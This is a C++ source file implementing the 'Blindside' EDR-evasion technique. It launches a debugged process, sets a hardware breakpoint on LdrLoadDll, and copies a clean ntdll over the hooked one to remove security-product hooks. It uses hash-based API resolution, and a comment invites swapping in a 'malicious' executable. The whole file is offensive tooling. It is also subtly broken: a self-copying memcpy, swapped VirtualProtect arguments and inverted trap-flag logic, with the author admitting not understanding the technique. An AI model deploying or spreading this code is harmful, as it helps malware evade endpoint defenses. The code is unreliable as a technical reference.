/*
* Title: Blindside
* Notes: To be honest, I've not understood how this technique works yet...
* Resources:
*	- https://github.com/CymulateResearch/Blindside
*	- https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints
*/
#include <Windows.h>
#include <string>
#include <stdio.h>
#include "Nt.hpp"
#include "Blindside.hpp"

DWORD calcHash(char* str) {
	DWORD hash = 0x99;
	for (int i = 0; i < strlen(str); i++) {
		hash += str[i] + (hash << 1);
	}
	return hash;
}

static DWORD calcHashModule(LDR_MODULE* pLdrModule) {
	char name[64];
	size_t i = 0;

	while (pLdrModule->dllname.Buffer[i] && i < sizeof(name) - 1) {
		name[i] = (char)pLdrModule->dllname.Buffer[i];
		i++;
	}
	name[i] = 0;
	return calcHash((char*)CharLowerA(name));
}

HMODULE GetModuleFromPEB(DWORD wModuleHash)
{
#if defined( _WIN64 )  
#define PEBOffset 0x60  
#define LdrOffset 0x18  
#define ListOffset 0x10  
	unsigned long long pPeb = __readgsqword(PEBOffset); // read from the GS register
#elif defined( _WIN32 )  
#define PEBOffset 0x30  
#define LdrOffset 0x0C  
#define ListOffset 0x0C  
	unsigned long pPeb = __readfsdword(PEBOffset);
#endif       
	pPeb = *reinterpret_cast<decltype(pPeb)*>(pPeb + LdrOffset);
	PLDR_DATA_TABLE_ENTRY pModuleList = *reinterpret_cast<PLDR_DATA_TABLE_ENTRY*>(pPeb + ListOffset);
	while (pModuleList->DllBase) {
		// Convert WCHAR to CHAR
		char dll_name[MAX_PATH];
		size_t ret;
		wcstombs_s(&ret, dll_name, pModuleList->BaseDllName.Buffer, MAX_PATH);

		if (calcHash(CharLowerA(dll_name)) == wModuleHash)
			return (HMODULE)pModuleList->DllBase;

		pModuleList = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pModuleList->InLoadOrderLinks.Flink);
	}
	return nullptr;
}

uintptr_t GetAPIFromPEBModule(void* hModule, DWORD ApiHash)
{
#if defined( _WIN32 )   
	unsigned char* lpBase = reinterpret_cast<unsigned char*>(hModule);
	IMAGE_DOS_HEADER* idhDosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(lpBase);
	if (idhDosHeader->e_magic == 0x5A4D)
	{
#if defined( _M_IX86 )  
		IMAGE_NT_HEADERS32* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS32*>(lpBase + idhDosHeader->e_lfanew);
#elif defined( _M_AMD64 )  
		IMAGE_NT_HEADERS64* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS64*>(lpBase + idhDosHeader->e_lfanew);
#endif  
		if (inhNtHeader->Signature == 0x4550)
		{
			IMAGE_EXPORT_DIRECTORY* iedExportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(lpBase + inhNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			for (register unsigned int uiIter = 0; uiIter < iedExportDirectory->NumberOfNames; ++uiIter)
			{
				char* szNames = reinterpret_cast<char*>(lpBase + reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfNames)[uiIter]);
				if (calcHash(szNames) == ApiHash)
				{
					unsigned short usOrdinal = reinterpret_cast<unsigned short*>(lpBase + iedExportDirectory->AddressOfNameOrdinals)[uiIter];
					return reinterpret_cast<uintptr_t>(lpBase + reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfFunctions)[usOrdinal]);
				}
			}
		}
	}
#endif  
	return 0;
}

// Set Hardware Breakpoint to the address of the target DLL such as LdrLoadDll.
BOOL SetHWBP(DWORD_PTR addr, HANDLE hThread) {
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_INTEGER;
	ctx.Dr0 = addr; // Set the address for breakpoint.
	ctx.Dr7 = 0x00000001; // Enable DR0.

	SetThreadContext(hThread, &ctx);

	DEBUG_EVENT dbgEvent;
	while (TRUE) {
		if (!WaitForDebugEvent(&dbgEvent, INFINITE)) return FALSE;

		if (dbgEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT &&
			dbgEvent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {
			CONTEXT newCtx = { 0 };
			newCtx.ContextFlags = CONTEXT_ALL;
			GetThreadContext(hThread, &newCtx);
			if (dbgEvent.u.Exception.ExceptionRecord.ExceptionAddress == (LPVOID)addr) {
				printf("Breakpoint hit!\n");

				// Cleanup
				newCtx.Dr0 = newCtx.Dr6 = newCtx.Dr7 = 0;
				newCtx.EFlags |= ~(1 << 8); // TF = 1
				return TRUE;
			}
			else {
				// Reinit
				newCtx.Dr0 = addr;
				newCtx.Dr7 = 0x00000001;
				newCtx.EFlags &= ~(1 << 8); // TF = 0
			}
			SetThreadContext(hThread, &newCtx);
		}
		ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
	}
}

BOOL GetImageExportDirectory(PVOID pNtdllBase, PIMAGE_EXPORT_DIRECTORY* ppExportDir) {
	// Get image export directory.
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pNtdllBase;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + pDosHeader->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
	// Get Export Address Table
	*ppExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pNtdllBase + pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

PVOID GetTableEntry(PVOID pNtdllBase, PIMAGE_EXPORT_DIRECTORY pExportDir, CHAR* sFuncNameToFind) {
	PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfFunctions);
	PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNames);
	PWORD pwAddrOfNameOrdinals = (PWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNameOrdinals);

	PVOID pFuncAddr = 0x00;
	for (WORD cx = 0; cx < pExportDir->NumberOfNames; cx++) {
		PCHAR pczFuncName = (PCHAR)((PBYTE)pNtdllBase + pdwAddrOfNames[cx]);
		PVOID pFuncAddr = (PBYTE)pNtdllBase + pdwAddrOfFunctions[pwAddrOfNameOrdinals[cx]];

		if (std::strcmp(sFuncNameToFind, pczFuncName) == 0) {
			WORD cw = 0;
			while (TRUE) {
				if (*((PBYTE)pFuncAddr + cw) == 0x0f && *((PBYTE)pFuncAddr + cw + 1) == 0x05) {
					return 0x00;
				}

				// Check if ret, in this case we are also probably too far
				if (*((PBYTE)pFuncAddr + cw) == 0xc3) {
					return 0x00;
				}

				if (*((PBYTE)pFuncAddr + cw) == 0x4c &&
					*((PBYTE)pFuncAddr + 1 + cw) == 0x8b &&
					*((PBYTE)pFuncAddr + 2 + cw) == 0xd1 &&
					*((PBYTE)pFuncAddr + 3 + cw) == 0xb8 &&
					*((PBYTE)pFuncAddr + 6 + cw) == 0x00 &&
					*((PBYTE)pFuncAddr + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFuncAddr + 5 + cw);
					BYTE low = *((PBYTE)pFuncAddr + 4 + cw);
					WORD syscall = (high << 8) | low;
					return pFuncAddr;
				}
				cw++;
			}
		}
	}
	return pFuncAddr;
}

BOOL OverwriteNtdll(
	PVOID pNtdllBase,
	PVOID pFreshNtdllBase,
	PIMAGE_EXPORT_DIRECTORY pHookedExportDir,
	PIMAGE_EXPORT_DIRECTORY pExportDir,
	PIMAGE_SECTION_HEADER pTextSection
) {
	PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)pNtdllBase + pHookedExportDir->AddressOfFunctions);
	PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)pNtdllBase + pHookedExportDir->AddressOfNames);
	PWORD pwAddrOfNameOrdinals = (PWORD)((PBYTE)pNtdllBase + pHookedExportDir->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pHookedExportDir->NumberOfNames; cx++) {
		PCHAR pczFuncName = (PCHAR)((PBYTE)pNtdllBase + pdwAddrOfNames[cx]);
		PVOID pFuncAddr = (PBYTE)pNtdllBase + pdwAddrOfFunctions[pwAddrOfNameOrdinals[cx]];

		if (!strstr(pczFuncName, (CHAR*)"Nt")) {
			PVOID pFuncAddr = GetTableEntry(pFreshNtdllBase, pExportDir, pczFuncName);
			if (pFuncAddr != 0x00 & std::strcmp((CHAR*)"NtAccessCheck", pczFuncName) != 0) {
				if (strcmp(pczFuncName, "NtAllocateVirtualMemory") == 0) {
					printf("Function name: %s\n", pczFuncName);
					printf("Address of function: 0x%p\n", pFuncAddr);
					
					PVOID pTextSectionAddr = (LPVOID)((DWORD_PTR)pNtdllBase + (DWORD_PTR)pTextSection->VirtualAddress);

					DWORD dwOldProtect;
					if (!VirtualProtect(pTextSectionAddr, PAGE_EXECUTE_WRITECOPY, pTextSection->Misc.VirtualSize, &dwOldProtect)) {
						return FALSE;
					}

					// Copy the syscall stub from the fresh ntdll.dll to the hooked ntdll
					if (!std::memcpy((LPVOID)pFuncAddr, (LPVOID)pFuncAddr, 23)) {
						return FALSE;
					}

					// Change back to the old permission.
					if (!VirtualProtect(pTextSectionAddr, dwOldProtect, pTextSection->Misc.VirtualSize, &dwOldProtect)) {
						return FALSE;
					}
				}
			}
		}
	}

	return TRUE;
}

BOOL CopyDllFromDebugProcess(HANDLE hProcess, size_t dllBaseAddr, BOOL bStealth) {
	HMODULE hKernel32 = GetModuleFromPEB(HASH_KERNEL32);
	if (!hKernel32) return FALSE;
	HMODULE hNtdll = GetModuleFromPEB(HASH_NTDLL);
	if (!hNtdll) return FALSE;

	_NtReadVirtualMemory ntReadVirtualMemory = reinterpret_cast<_NtReadVirtualMemory>(GetAPIFromPEBModule(hNtdll, HASH_NTREADVIRTUALMEMORY));
	if (!ntReadVirtualMemory) return FALSE;
	_VirtualProtect virtualProtect = reinterpret_cast<_VirtualProtect>(GetAPIFromPEBModule(hKernel32, HASH_VIRTUALPROTECT));
	if (!virtualProtect) return FALSE;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllBaseAddr;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBaseAddr + pDosHeader->e_lfanew);
	IMAGE_OPTIONAL_HEADER optHeader = (IMAGE_OPTIONAL_HEADER)pNtHeaders->OptionalHeader;
	PIMAGE_SECTION_HEADER pTextSection = IMAGE_FIRST_SECTION(pNtHeaders);

	DWORD dwDllSize = optHeader.SizeOfImage;

	if (bStealth) {
		LPVOID lpFreshNtdll = VirtualAlloc(nullptr, dwDllSize, MEM_COMMIT, PAGE_READWRITE);
		if (!lpFreshNtdll) return FALSE;
		NTSTATUS status = ntReadVirtualMemory(hProcess, (PVOID)dllBaseAddr, lpFreshNtdll, dwDllSize, 0);
		if (!NT_SUCCESS(status)) {
			return FALSE;
		}

		PIMAGE_EXPORT_DIRECTORY pExportDir = nullptr;
		if (!GetImageExportDirectory(lpFreshNtdll, &pExportDir) || !pExportDir) {
			printf("Error getting ImageExportDirectory.\n");
		}
		PIMAGE_EXPORT_DIRECTORY pHookedExportDir = nullptr;
		if (!GetImageExportDirectory((PVOID)dllBaseAddr, &pHookedExportDir) || !pHookedExportDir) {
			printf("Error getting ImageExportDirectory.\n");
		}
		if (!pExportDir || !pHookedExportDir) {
			return FALSE;
		}
		if (!OverwriteNtdll((LPVOID)dllBaseAddr, lpFreshNtdll, pHookedExportDir, pExportDir, pTextSection)) {
			return FALSE;
		}

		return TRUE;
	}
	else {
		PBYTE pFreshDll = new BYTE[dwDllSize];

		NTSTATUS status = (*ntReadVirtualMemory)(hProcess, (PVOID)dllBaseAddr, pFreshDll, dwDllSize, 0);
		if (!NT_SUCCESS(status)) {
			delete[] pFreshDll;
			return FALSE;
		}

		for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
			PIMAGE_SECTION_HEADER pHookedSecHeader = (PIMAGE_SECTION_HEADER)((unsigned long long)IMAGE_FIRST_SECTION(pNtHeaders) + ((unsigned long long)IMAGE_SIZEOF_SECTION_HEADER * i));
			if (strcmp((char*)pHookedSecHeader->Name, (char*)".text") != 0)
				continue;

			// Get the source and destination addresses for the .text section.
			LPVOID lpSrcAddr = (LPVOID)((DWORD_PTR)pFreshDll + (DWORD_PTR)pHookedSecHeader->VirtualAddress);
			LPVOID lpDestAddr = (LPVOID)((DWORD_PTR)dllBaseAddr + (DWORD_PTR)pHookedSecHeader->VirtualAddress);

			DWORD dwOldProtect = 0;
			if (!virtualProtect(lpDestAddr, pHookedSecHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
				return FALSE;
			}

			DWORD dwTextSectionSize = pHookedSecHeader->Misc.VirtualSize;

			// Calculate the number of chunks needed to copy the entire .text section.
			size_t chunkSize = 1024;
			size_t numChunks = (dwTextSectionSize + chunkSize - 1) / chunkSize;

			// Iterate over each chunk and copy it to the destination.
			for (size_t i = 0; i < numChunks; i++) {
				size_t chunkStart = i * chunkSize;
				size_t chunkEnd = min(chunkStart + chunkSize, dwTextSectionSize);
				size_t newChunkSize = chunkEnd - chunkStart;
				memcpy((char*)lpDestAddr + chunkStart, (char*)lpSrcAddr + chunkStart, chunkSize);
			}

			if (!virtualProtect(lpDestAddr, pHookedSecHeader->Misc.VirtualSize, dwOldProtect, &dwOldProtect)) {
				return FALSE;
			}

			delete[] pFreshDll;
			return TRUE;
		}
		return FALSE;
	}
}

BOOL Blindside() {
	std::wstring wProcName = L"C:\\Windows\\System32\\calc.exe"; // Replace it with your 'malicious' executable to execute.
	BOOL bStealth = TRUE; // TRUE = Unhooking one function.

	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess(
		wProcName.c_str(),
		nullptr,
		nullptr,
		nullptr,
		FALSE,
		DEBUG_PROCESS,
		nullptr,
		nullptr,
		&si,
		&pi
	)) {
		return FALSE;
	}
	
	HMODULE hNtdll = GetModuleFromPEB(HASH_NTDLL);
	if (!hNtdll) return FALSE;
	HMODULE hKernel32 = GetModuleFromPEB(HASH_KERNEL32);
	if (!hKernel32) return FALSE;

    // The LdrLoadDll function will be invoked in the common PE such as notepad.exe, calc.exe etc.
	_LdrLoadDll ldrLoadDll = reinterpret_cast<_LdrLoadDll>(GetAPIFromPEBModule(hNtdll, HASH_LDRLOADDLL));
	if (!ldrLoadDll) return FALSE;
	size_t ldrLoadDllAddr = reinterpret_cast<size_t>(ldrLoadDll);

	SetHWBP((DWORD_PTR)ldrLoadDllAddr, pi.hThread);

    // Replace the hooked DLL (ntdllAddr) with the fresh DLL.
	size_t ntdllAddr = reinterpret_cast<size_t>(hNtdll);
	if (!CopyDllFromDebugProcess(pi.hProcess, ntdllAddr, bStealth)) {
		return FALSE;
	}

	CloseHandle(pi.hProcess);
	TerminateProcess(pi.hProcess, 0);

	return TRUE;
}
